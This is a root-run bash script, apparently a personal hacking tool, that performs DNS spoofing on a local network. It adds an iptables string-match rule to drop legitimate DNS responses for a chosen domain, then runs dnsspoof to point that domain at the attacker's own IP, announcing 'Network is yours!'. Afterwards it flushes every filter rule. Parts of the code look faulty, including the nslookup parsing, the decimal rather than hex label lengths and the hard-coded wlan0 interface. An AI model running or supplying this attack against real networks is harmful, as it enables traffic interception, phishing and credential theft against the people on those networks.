#!/bin/bash

# Args
if [ $(id -u) != "0" ]; then
    echo "Must be run as root"
    exit 1
fi

if [ ${#@} -ne 2 ]; then
    echo "Usage : dns-spoof-block [interface] [blocked dns]"
    exit 1
fi

INTERFACE=$1
BLOCKED_DNS=$2
BLOCKED_IP=$(nslookup $BLOCKED_DNS | egrep "^Server" | cut -f3)

# Dividing up Nameserver into parts, compatible with iptables hexstring recognition
str=""
i=1
while [ "$(echo $BLOCKED_DNS | cut -d "." -f$i)" != "" ]; do
    part=("$(echo $BLOCKED_DNS | cut -d "." -f$i)")
    n=${#part}
    [ "$n" -lt 10 ] && n="0$n"
    str="${str}|$n|$part"
    i=$(($i+1))
done
str="$str|"

echo $str

# Blocking
iptables -t filter -A FORWARD -i $INTERFACE -m string --algo bm --hex-string "$str" -j DROP
echo "[*] Blocked server responses. Network is yours!"

# Spoofing
my_ip=$(ip a | egrep "wlan0" | egrep "^    inet" | cut -d " " -f6 | head -c-4)
echo "[*] Launching dns spoofer..."
#python /home/leo/HackingScripts/dns-spoofer.py $BLOCKED_IP $my_ip $INTERFACE
echo "$my_ip	$BLOCKED_DNS" > hosts_tmp.txt
dnsspoof -i $INTERFACE -f hosts_tmp.txt

# Waiting for Ctrl+C

# Unblocking
echo -e "\n\nDisabling filter"
iptables -t filter -F
rm hosts_tmp.txt
echo "DONE"
